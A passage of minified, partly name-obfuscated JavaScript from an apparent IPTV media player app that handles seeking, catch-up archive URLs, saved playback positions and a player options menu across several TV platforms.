if(lIO1OIOlAQzl1Ol1lYpr=="media"&&uaJ=="lg"&&kjtYpr.series!="LW"){loaderTimer=setTimeout('$_("loading").style.display="none";',25000)}else{if(lIO1OIOlAQzl1Ol1lYpr=="tizen"||platform=="sams")loaderTimer=setTimeout('$_("loading").style.display="none";',kjtYpr.GL.timeoutiptv*1000);else if(platform!="sams"&&uaJ!="mag"&&lIO1OIOlAQzl1Ol1lYpr!="tizen"){if(pstream||lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){loaderTimer=setTimeout('$_("loading").style.display="none";',1500)}else loaderTimer=setTimeout('$_("loading").style.display="none";',10000)}else loaderTimer=setTimeout('$_("loading").style.display="none";',60000)}}
if(mode=="off"&&($_("loading").style.display!="none"||is_img(playUrl)||gV(playElement,"type")=="img")&&lastSec!=sec){forwarded=!1;$_("loading").style.display="none";console.log("TRIG 300 HIDE");triggerHide(900,!0)}}
function renderPlayer(url){if(plmini_on)return;if(url==null)url=playUrl;var shortUrl=(url=='assync')?".."+playElement.stream_url.substr(url.length-23):".."+url.substr(url.length-23);lI1I1IxFCIh1l01llYpr("recovery","");if(platform=="android-device"){if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"||lIO1OIOlAQzl1Ol1lYpr=="jw"||lIO1OIOlAQzl1Ol1lYpr=="playerjs"||is_img(url)||gV(playElement,"type")=="img"){$_("player").style.backgroundColor="transparent"}else $_("player").style.backgroundColor="black"}
$_("jw").style.zIndex="0";if(lIO1OIOlAQzl1Ol1lYpr=="download")pstr="_FPPereadresaciyaNaFail_...";else if(gV(sIconPlayer,lIO1OIOlAQzl1Ol1lYpr)!="")pstr="<img id='ico_p' style='padding-top:1px;' width='"+css_w(27)+"' src='"+_img("_ST_"+sIconPlayer[lIO1OIOlAQzl1Ol1lYpr])+"' />";else pstr="";if(is_rek){$_("prekinfo").style.display="block";return}else if(playElement.stream_url=="description"){$_("playerBottom").style.height=css_wh(20)+"px";$_("playerBottom").style.top=css_wh(innerH-11)+"px"}else{lI1I1IxFCIh1l01llYpr("pstr",pstr);lI1I1IxFCIh1l01llYpr("infR","");lI1I1IxFCIh1l01llYpr("infPl","")}
lI1I1IxFCIh1l01llYpr("remainingTime","");lI1I1IxFCIh1l01llYpr("totalTime","");if(kjtYpr.GL.next==1)var vr="_FPPosledovatelno_";else if(kjtYpr.GL.next==2)vr="_FPPovtoryat_ _FPodin_";else if(kjtYpr.GL.next==4)vr="_FPOtkl._";else vr="_FPPovtoryat_ _FPvse_";if(is_img(playUrl)||gV(playElement,"type")=="img")var timer=40;else timer=1200;tl="<div id='chtitle' style='line-height: 1;'>"+playElement.title+"</div>";if(gP().is_iptv>2)vr="<img width='"+css_w(28)+"' height='"+css_wh(23)+"' src='"+playElement.logo_30x30+"'> ";var dopnum="";if(typeof playElement.playlist=="object"){if(playElement.playlist.length){dopnum="<br><span style='font-size:80%;'>"+(PLINDEX+1)+"/"+(playElement.playlist.length)+"</span>"}}
lI1I1IxFCIh1l01llYpr("ptt","<div id='info_right' style='float: right;width: 238px;font-size: 75%;overflow:hidden;padding-top:29px;text-align:right;'>"+vr+"<br>"+shortUrl+"<div id='pinfo' style='float:right;color:#CB0048;'></div></div>"+"<div id='info_num' style='float:left;width:5%;font-size:120%;padding-top: 12px;'>"+(getSelect()+1)+"."+dopnum+"</div>"+tl);getshowEpg();setTimeout(function(){},timer)}
function setLoadPosition(position,per){gl_buf=0;if(is_arc){$_("arrowtime").style.display="block";var xt=T.timestamp+arc_fwd+position;var tt=gV(playElement,"catchup_days")*24*3600;var pos=Math.ceil(((tt+arc_fwd+position)/tt)*innerW);setPosition(pos);if(pos/innerW>0.95)pos=Math.ceil(0.95*innerW);if(pos/innerW<0.02)pos=30;$_("arrowtime").style.left=(pos-css_w(80))+"px";lI1I1IxFCIh1l01llYpr('arrowtime',dt(xt,!0,!0));return}
curTime=getCur();totalTime=getTotal();position=curTime+position;if(position>0&&position<totalTime){var pos=Math.ceil((position/totalTime)*innerW);var xn=Math.ceil(T.inetTime/1000)-7*24*3600;if(arc_fwd==0)
setPosition(pos);$_("arrowtime").style.display="block";if(pos/innerW>0.96)pos=Math.ceil(0.96*innerW);if(pos/innerW<0.02)pos=30;$_("arrowtime").style.left=(pos-css_w(30))+"px";if(per==null)lI1I1IxFCIh1l01llYpr('arrowtime',getTimeFromMS(position));else lI1I1IxFCIh1l01llYpr('arrowtime',per+"%")}}
var qch_num="",qch_timer;function setKey(k){console.log("setkey="+k);clearTimeout(qch_timer);qch_timer=setTimeout(function(){qch_num=parseInt(qch_num);if(qch_num>gP().channels.length){qch_num=gP().channels.length}
Ill1110().focused(qch_num-1);qch_num=""},1300);qch_num=qch_num+k;kjtYpr.popUp("Select to: "+(qch_num<=0?"Inset":qch_num),1500,"on",!0)}
function setPercent(per){if(is_arc){var tt=Math.ceil(T.timestamp-(1-(per/100))*gV(playElement,"catchup_days")*24*3600);console.log(tt);arc_fwd=0;arc_timestamp=0;arcfwd(Math.ceil(tt-T.timestamp));return}else if(gP("is_iptv")>2){clearTimeout(qch_timer);qch_timer=setTimeout(function(){qch_num=parseInt(qch_num);if(qch_num>gP().channels.length){kjtYpr.popUp("Не существует!",1300)}else{setSelect(qch_num-1);Ill1110().play()}
qch_num=""},1300);qch_num=qch_num+per/10;kjtYpr.popUp("Open channel: "+qch_num,1500,"on",!0);return}else sec=Math.ceil(((per/100)*getTotal())-getCur());setLoadPosition(sec,per);if(sec<0)lI1llO1QIebXl10lO1Ypr(sec,!0);else lIl0I1O0Iab1I10Ypr(sec,!0)}
function arcurl(u,t,catchup,catchup_source){var au=u;if(catchup=="default"&&catchup_source!=""){au=catchup_source.replace("${start}",t).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-t)}else if(catchup=="append"&&catchup_source!=""){au+=catchup_source.replace("${start}",t).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-t)}else if(catchup=="flussonic"||catchup=="fs"||catchup=="flussonic-hls"){au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+t+"-10800$3$4")}else if(catchup=="shift"||1){if(u.indexOf("?")>0)au+="&";else au+="?";au+="utc="+t+"&lutc="+T.timestamp}
return au}
var forwarded=!1,arc_fwd=0,arc_timestamp=0;function arcfwd(sec){console.log(sec);if(platform=="sams")samsStop();else if(lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){lI1I1IxFCIh1l01llYpr("other","");video.src=""}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"){video.src=""}else{lI1I1IxFCIh1l01llYpr("jw","");lI1I1IxFCIh1l01llYpr("other","")}
arc_fwd+=sec;videoLoad("on");arc_timestamp=T.timestamp+arc_fwd;if(gV(playElement,"source_url")!="")var u=playElement.source_url;else u=playElement.stream_url;l0OIQIl1OI0IlI0lIYpr(arcurl(u,(T.timestamp+arc_fwd),gV(playElement,"catchup"),gV(playElement,"catchup_source")));getVideoPlayInfo()}
function lIl0I1O0Iab1I10Ypr(sec,mode){if(rek_url!=""&&!l0lOIIIIItWYQ01I0IYpr)return!1;if(sec==null){if(glSec==0)sec=10;else if(glSec<100)sec=25;else sec=60}
if(mode==null){glSec+=sec;setLoadPosition(glSec);clearTimeout(wdtimer);wdtimer=setTimeout("lIl0I1O0Iab1I10Ypr("+glSec+",true)",1200);return}
glSec=0;sec=Math.ceil(sec);$_("arrowtime").style.display="none";if(gV(playElement,"catchup")!=""&&gV(playElement,"catchup_days")!=""){arcfwd(sec)}else if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].seek(getCur()+sec)}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.setPositionInSeconds(getCur()+sec)}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.SetPosTime(stb.GetPosTime()+sec)}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){webapis.avplay.jumpForward(sec*1000);Player.cur_time=getCur()+sec}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){console.log("forward sams"+sec);videoLoad("on",Player.cur_time);if(Player.Sef){Player.SefPlugin.Execute('JumpForward',sec)}else{Player.plugin.JumpForward(sec)}}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){console.log("forward media"+sec);if(media.playPosition+sec*1000<media.playTime){videoLoad("on",media.playPosition);media.seek(media.playPosition+sec*1000)}}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){jwplayer("jw").seek(jwplayer("jw").getPosition()+sec)}else{if(uaJ=="spark"){var mt=(Math.ceil(video.currentTime/1000)+sec)*1000;if(mt>video.duration){var mt=sec+video.currentTime}
video.currentTime=mt}else if(getCur()<getTotal()||getTotal()<2){forwarded=!0;videoLoad("on",video.currentTime);video.currentTime+=sec}}
if(playUrlAudio!="")sound.currentTime=getCur();setTimeout("l0IOlIO00JlIIOlOYpr();",3000)}
function lI1llO1QIebXl10lO1Ypr(sec,mode){if(rek_url!=""&&!l0lOIIIIItWYQ01I0IYpr)return!1;if(sec==null){if(glSec==0)sec=-10;else if(glSec>-100)sec=-25;else sec=-60}
if(mode==null){glSec+=sec;setLoadPosition(glSec);clearTimeout(wdtimer);wdtimer=setTimeout("lI1llO1QIebXl10lO1Ypr("+glSec+",true)",1200);return}
glSec=0;sec=Math.ceil(sec);$_("arrowtime").style.display="none";if(gV(playElement,"catchup")!=""){arcfwd(sec)}else if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].seek(getCur()+sec)}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.setPositionInSeconds(getCur()+sec)}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.SetPosTime(stb.GetPosTime()+sec)}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){webapis.avplay.jumpBackward(-1000*sec);Player.cur_time=getCur()+sec}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){videoLoad("on",Player.cur_time);if(Player.Sef){Player.SefPlugin.Execute('JumpBackward',-1*sec)}else{Player.plugin.JumpBackward(-1*sec)}}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){jwplayer("jw").seek(jwplayer("jw").getPosition()+sec)}else{if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){videoLoad("on",media.playPosition);if(media.playPosition+sec*1000>0)media.seek(media.playPosition+sec*1000);else media.seek(0)}else{videoLoad("on",video.currentTime);if(getCur()+sec>0){video.currentTime+=sec}else video.currentTime=0}}
if(playUrlAudio!="")sound.currentTime=getCur();setTimeout("l0IOlIO00JlIIOlOYpr();",3000)}
var lI0lOIE0IjIIlOO1Ypr=0,ftimes=null;function getSaveTime(){var ident=gV(playElement,"ident");console.log("getSaveTime "+ident);if(ident==""||rek_url!=""||is_rek)return;try{if(ftimes==null)return;if(typeof ftimes[ident]!="undefined"){if(ftimes[ident][1]<150&&pstream&&!is_vod())return;lI0lOIE0IjIIlOO1Ypr=ftimes[ident][0];$_("recovery").style.display=$_("playerBottom").style.display;$_("recovery").style.zIndex="2";lI1I1IxFCIh1l01llYpr("recovery","_FPVozobnovitNa_<br/>["+getTimeFromMS(lI0lOIE0IjIIlOO1Ypr)+"]");if(ftimes[ident][2])ftimes[ident][2]++;else ftimes[ident][2]=1;kjtYpr.lll0Il11OxICbl1ll0Ypr("times",llIl1I1HlMgNII1IO0Ypr(ftimes))}else if(gV(playElement,"start_time")>0){lI0lOIE0IjIIlOO1Ypr=playElement.start_time;$_("recovery").style.display=$_("playerBottom").style.display;$_("recovery").style.zIndex="2";lI1I1IxFCIh1l01llYpr("recovery","_FPVozobnovitNa_<br/>["+getTimeFromMS(lI0lOIE0IjIIlOO1Ypr)+"]")}else if(typeof allTimes[ident]!="undefined"){lI0lOIE0IjIIlOO1Ypr=allTimes[ident][0];$_("recovery").style.display=$_("playerBottom").style.display;$_("recovery").style.zIndex="2";lI1I1IxFCIh1l01llYpr("recovery",allTimes[ident].d+"<br/>["+getTimeFromMS(lI0lOIE0IjIIlOO1Ypr)+"]")}}catch(e){console.log(e)}}
function lO1I011lII1RO0lO1OOYpr(){if(rek_url!=""){if(ttmac)kjtYpr.popUp("lO1I011lII1RO0lO1OOYpr false rek="+rek_url,2500);return}
if(ttmac)kjtYpr.popUp("lO1I011lII1RO0lO1OOYpr "+st,2500);if(platform=="sams"||lIO1OIOlAQzl1Ol1lYpr=="tizen"||lIO1OIOlAQzl1Ol1lYpr=="jw"){if(getCur()<1)return;var st=lI0lOIE0IjIIlOO1Ypr-getCur();if(st>0)lIl0I1O0Iab1I10Ypr(st);else lI1llO1QIebXl10lO1Ypr(st)}else{totalTime=getTotal();console.log(totalTime);if(isNaN(totalTime))return;if(totalTime<1)return;var sec=lI0lOIE0IjIIlOO1Ypr;if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.setPositionInSeconds(sec)}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.SetPosTime(sec)}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){videoLoad("on",media.playPosition);media.seek(sec*1000)}else{videoLoad("on",video.currentTime);video.currentTime=sec}}
lI1I1IxFCIh1l01llYpr("recovery","");lI0lOIE0IjIIlOO1Ypr=0}
function SaveTime(mode){try{if(typeof mode=='undefined')mode="";var ident=gV(playElement,"ident");console.log("SaveTime id "+ident+" is_rek "+is_rek);if(rek_url!=""||is_rek)return;if(platform=="sams"||platform=="android-device"||platform=="tizen")limit_arr=1500;else limit_arr=400;console.log("rek_url "+rek_url);if(lastViewUrlGo)if(lastViewUrlOrig!=lastViewUrl){console.log("SaveTime no ORIG "+lastViewUrlOrig);return}
if(pstream&&!is_vod()&&(getTotal()<150||getTotal()>11*3600)){console.log("NO SaveTime is no vod ="+is_vod());return}
if(ident==""||rek_url!=""||is_img(playUrl)||gV(playElement,"type")=="img"){console.log("NO SaveTime is no ident="+ident);return}
if(plmini_on)return;if(mode=="andr"){curTime=3;totalTime=3}else{curTime=getCur();totalTime=getTotal()}
console.log("="+curTime);if(curTime>2&&totalTime>0){if(ftimes==null)ftimes={};try{var st=0,id=null,len=0;for(var i in ftimes){if(ftimes[i][2]<st||st==0){id=i;st=ftimes[i][2]}
len++}
if(len>limit_arr)delete ftimes[id];if(typeof ftimes[ident]!="undefined"){if(curTime>ftimes[ident][0]||totalTime-ftimes[ident][0]<40)ftimes[ident][0]=curTime;ftimes[ident][1]=totalTime;ftimes[ident][2]=Math.ceil(T.inetTime/10000000)}else ftimes[ident]=[curTime,totalTime,Math.ceil(T.inetTime/10000000)];kjtYpr.lll0Il11OxICbl1ll0Ypr("times",llIl1I1HlMgNII1IO0Ypr(ftimes))}catch(e){console.log(e)}}}catch(e){kjtYpr.popUp("Ошибка сохранения позиции видеофайла: "+e.message,500)}}
function getIdent(sel){if(sel==null)sel=getSelect();if(sel>=0){var ch=gP("channels")[sel];if(rek_url!=""&&sel==null)return"";var gi=gV(ch,"ident");if(gi!=""){if(gi.length==10)return gi;else return md5(gi).substr(0,10)}
var title=ch.title.replace("[HD] ","").replace("[SD] ","");var s="";try{if(ch.stream_url.indexOf("audio")==0)return"";s=oInset[insetActive].get("title",-1)+"-"+title;s=s.replace(/_FPGlobPoisk_.*?"/,"");return md5(s).substr(0,10)}catch(e){}}
return""}
function setWhitestripes(){if(whitestripes<1){$_("whitestripes1").style.display="none";$_("whitestripes2").style.display="none"}else{if(whitestripes>100)whitestripes=100;$_("whitestripes1").style.display="block";$_("whitestripes2").style.display="block";$_("whitestripes1").style.height=whitestripes+"px";$_("whitestripes2").style.height=whitestripes+"px";$_("whitestripes2").style.top=css_wh((720-whitestripes))+"px"}}
var optScreen=["_FPOriginal_","_FPRastyanut_","_FPRuchnoi_"];var optScreenJW=["_FPOriginal_","_FPRastyanut_","Fill"];var optScreenJWE=["uniform","exactfit","fill"];var optLang=["Нет","ru","rus","ua","en","eng","de","fr","lt","et"],optLangSel=0,optId=[];var audioTrackHtml5=0;function newOptions(){var l1II1IlOORHvj11O1Ypr="",id=0;try{if(typeof playElement.json_url=="object"){for(var i in playElement.json_url){if(gV(playElement,"json_select")!=i)l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,i+"p "+gV(playElement.json_url[i],"type"),!0,"enterqual"+i)}}
if(uaJ=="mag")l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPGromkost_",!1,"magvolume");if(uaJ=="mag"||uaJ=="dune"){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPProporcii_ _FPvideo_: "+kjtYpr.GL.xmode,!1,"magprop")}else if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPInFullScreen_",!0,"full");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPGromkost_",!1,"playerjsvolume")}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"JW _FPEkran_: "+optScreenJW[kjtYpr.GL.xmode],!1,"jwstretching");if(jwplayer("jw").getAudioTracks().length>1){var curA=jwplayer("jw").getCurrentAudioTrack();if(curA==0)curA="Auto";l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"JW Audio: "+jwplayer("jw").getAudioTracks()[jwplayer("jw").getCurrentAudioTrack()].name+" ("+curA+"/"+jwplayer("jw").getAudioTracks().length+")",!1,"jwaudio")}
if(jwplayer("jw").getQualityLevels().length>1){var curA=jwplayer("jw").getCurrentQuality();if(curA==0)curA="Auto";l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"JW Quality: "+" ("+curA+"/"+(jwplayer("jw").getQualityLevels().length-1)+")",!1,"jwquality")}
l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"JW Rate: "+jwplayer("jw").getPlaybackRate()+"x",!1,"jwrate")}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPEkran_: "+optScreen[kjtYpr.GL.xmode],!1,"tizenekran");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPZvukDorozhka_ "+kjtYpr.a_num+"/"+Player.tnum,!1,"setaudio");if(Player.snum>0)l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPSubtitles_ MKV: "+kjtYpr.s_num+"/"+Player.snum,!1,"setsubtitle")}else if(platform=="sams"){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPGromkost_",!1,"samsvolume");if(Player.tnum>20)Player.tnum=1;l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPZvukDorozhka_ "+kjtYpr.a_num+"/"+Player.tnum,!1,"samsdor");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPTip_ 3D",!1,"sams3d");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPBuffer_: "+abf[kjtYpr.GL.buffer]+" Мб",!1,"samsbuf");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPEkran_: "+optScreen[kjtYpr.GL.xmode],!1,"samsekran");if(kjtYpr.GL.xmode==2){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPShirina_: "+kjtYpr.GL.Pw+"%",!1,"samsekranPw");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPVisota_: "+kjtYpr.GL.Ph+"%",!1,"samsekranPh")}}else{if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPOpciiEkrana_",!0,"lgoptions");if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){try{if(video.audioTracks!=null)if(video.audioTracks.length>1){console.log(video.audioTracks);l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPZvukDorozhka_ "+video.audioTracks[audioTrackHtml5].language+" "+(audioTrackHtml5+1)+"/"+video.audioTracks.length,!1,"audioTracks");for(var i=0;i<video.audioTracks.length;i++){}}}catch(e){}
if(kjtYpr.GL.xmode==0)l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPProporcii_ _FPvideo_ Auto",!1,"prophtml5");else l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPProporcii_ _FPvideo_ "+kjtYpr.GL.xmode,!1,"prophtml5");if(kjtYpr.GL.xmode==4){kjtYpr.GL.Pw=parseFloat(kjtYpr.GL.Pw);kjtYpr.GL.Ph=parseFloat(kjtYpr.GL.Ph);if(kjtYpr.GL.Pw<200)kjtYpr.GL.Pw=1280;if(kjtYpr.GL.Ph<200)kjtYpr.GL.Ph=720;l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPShirina_: "+kjtYpr.GL.Pw+"",!1,"setpw");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPVisota_: "+kjtYpr.GL.Ph+"",!1,"setph")}}
if(((uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")&&lIO1OIOlAQzl1Ol1lYpr=="media")){l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPPredpDor_: "+optLang[optLangSel],!1,"lgzvdor")}
if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5")l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPInFullScreen_",!0,"full")}
if(subsrc.length>0){if(sub_sel==0)l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPSubtitles_: _FPOtkl_",!1,"subtitle");else l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPSubtitles_: "+subsrc[sub_sel-1][0],!1,"subtitle")}
if(whitestripes<1)l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPAdd stripes_:_FPOtkl._",!1,"whitestripes");else l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPAdd stripes_:"+whitestripes+"px",!1,"whitestripes");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,sNext[kjtYpr.GL.next],!1,"rezhim");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPDisplay time_: "+shint(kjtYpr.GL.time),!1,"time");l1II1IlOORHvj11O1Ypr+=l1Il1I1l0bMllOlQOOYpr(id++,"_FPZakrit_",!0,"close");$_("QualCh").style.display="block";kjtYpr.opLength=id;lI1I1IxFCIh1l01llYpr("QualCh",l1II1IlOORHvj11O1Ypr);handler="qual";l000IlIOlu1l1I1llQlYpr()}catch(e){kjtYpr.popUp(e.message)}}
function l000IlIOlu1l1I1llQlYpr(){if(kjtYpr.llII110Ic1wWOIIIlYpr<0)kjtYpr.llII110Ic1wWOIIIlYpr=kjtYpr.opLength-1;else if(kjtYpr.llII110Ic1wWOIIIlYpr==kjtYpr.opLength)kjtYpr.llII110Ic1wWOIIIlYpr=0;for(var i=0;i<kjtYpr.opLength;i++){if(i==kjtYpr.llII110Ic1wWOIIIlYpr){$_("ql1II1IlOORHvj11O1Ypr"+i).style.color="#FFFFFF"}else{$_("ql1II1IlOORHvj11O1Ypr"+i).style.color="#888888"}}}
var l1Q0l1I0_1PEOIOIl0Ypr=null,magprop=1;function magpropv(){if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){if(kjtYpr.GL.xmode>3)kjtYpr.GL.xmode=1;if(kjtYpr.GL.xmode<1)kjtYpr.GL.xmode=3;stb.setAspectRatio(kjtYpr.GL.xmode-1)}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){if(kjtYpr.GL.xmode>5)kjtYpr.GL.xmode=1;if(kjtYpr.GL.xmode<1)kjtYpr.GL.xmode=5;if(kjtYpr.GL.xmode==1)stb.SetAspect(0x10);else if(kjtYpr.GL.xmode==2)stb.SetAspect(0x20);else if(kjtYpr.GL.xmode==3)stb.SetAspect(0x30);else if(kjtYpr.GL.xmode==4)stb.SetAspect(0x40);else if(kjtYpr.GL.xmode==5)stb.SetAspect(0x50)}
lI010lp_Z1l1O0Ypr("_FPProporcii_: "+kjtYpr.GL.xmode)}
var curV=1;function llIO1llNDl0IIlYpr(x){try{switch(optId[kjtYpr.llII110Ic1wWOIIIlYpr]){case "audioTracks":try{audioTrackHtml5+=x;if(audioTrackHtml5<0)audioTrackHtml5=video.audioTracks.length-1;else if(audioTrackHtml5>video.audioTracks.length-1)audioTrackHtml5=0;for(var i=0;i<video.audioTracks.length;i++){if(i==audioTrackHtml5)video.audioTracks[i].enabled=!0;else video.audioTracks[i].enabled=!1}video.audioTracks[audioTrackHtml5].language+lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPZvukDorozhka_ "+video.audioTracks[audioTrackHtml5].language+video.audioTracks[audioTrackHtml5].label+" "+(audioTrackHtml5+1)+"/"+video.audioTracks.length)}catch(e){lI010lp_Z1l1O0Ypr(e.message)}
break;case "samsvolume":if(x==-1)plaginAudio.SetVolumeWithKey(1);else if(x==1)plaginAudio.SetVolumeWithKey(0);break;case "samsdor":Player.SEFSetNextAudioStream(x);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPZvukDorozhka_ "+kjtYpr.a_num+"/"+Player.tnum);break;case "sams3d":Player.Set3Dtype(x);break;case "samsbuf":kjtYpr.GL.buffer=parseInt(kjtYpr.GL.buffer)+x;if(kjtYpr.GL.buffer<0)kjtYpr.GL.buffer=1;else if(kjtYpr.GL.buffer>20)kjtYpr.GL.buffer=20;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPBuffer_: "+abf[kjtYpr.GL.buffer]+" _FPMb_");Player.SetBuffer(kjtYpr.GL.buffer);break;case "samsekran":if(typeof kjtYpr.GL.xmode=="undefined")kjtYpr.GL.xmode=0;kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode)+x;if(kjtYpr.GL.xmode>2)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=2;Player.setSize(kjtYpr.GL.xmode);newOptions();kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "tizenekran":if(typeof kjtYpr.GL.xmode=="undefined")kjtYpr.GL.xmode=0;kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode)+x;if(kjtYpr.GL.xmode>2)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=2;setProp(kjtYpr.GL.xmode);newOptions();kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "samsekranPw":kjtYpr.GL.Pw=parseInt(kjtYpr.GL.Pw)+x;if(kjtYpr.GL.Pw>200)kjtYpr.GL.Pw=200;Player.setSize(kjtYpr.GL.xmode);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPShirina_: "+kjtYpr.GL.Pw+"%");kjtYpr.lll0Il11OxICbl1ll0Ypr("xmodePw",kjtYpr.GL.Pw);break;case "samsekranPh":kjtYpr.GL.Ph=parseInt(kjtYpr.GL.Ph)+x;if(kjtYpr.GL.Ph>200)kjtYpr.GL.Ph=200;Player.setSize(kjtYpr.GL.xmode);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPVisota_: "+kjtYpr.GL.Ph+"%");kjtYpr.lll0Il11OxICbl1ll0Ypr("xmodePh",kjtYpr.GL.Ph);break;case "videoqual":clearTimeout(l1Q0l1I0_1PEOIOIl0Ypr);kjtYpr.llII110Ic1wWOIIIlYprQualIndex+=x;if(kjtYpr.llII110Ic1wWOIIIlYprQualIndex>kjtYpr.l0O1011I0MAZWd0100lIYpr.length-1)kjtYpr.llII110Ic1wWOIIIlYprQualIndex=0;else 